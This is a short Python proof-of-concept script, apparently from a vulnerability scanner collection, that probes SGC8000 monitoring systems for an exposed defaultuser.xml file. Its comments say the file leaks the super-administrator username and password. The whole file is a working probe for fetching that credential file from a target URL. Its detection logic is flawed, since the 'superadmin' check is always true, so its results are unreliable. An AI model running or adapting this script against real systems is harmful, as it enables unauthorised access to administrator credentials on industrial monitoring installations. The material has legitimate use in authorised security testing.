#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: sgc8000监控系统超管账号泄露漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0135197
author: Lucifer
description: 文件defaultuser.xml中,泄露了超级管理员账号和密码。
'''
import sys
import requests


class sgc8000_defaultuser_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/app/sg8k_rs/config/defaultuser.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml" and r"superadmin":
                return "[+]存在sgc8000监控系统超管账号泄露漏洞...(高危)\tpayload: "+vulnurl
            else:
                return "[-]no"
        except:
            return "[-] ======>连接超时"


if __name__ == "__main__":
    testVuln = sgc8000_defaultuser_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()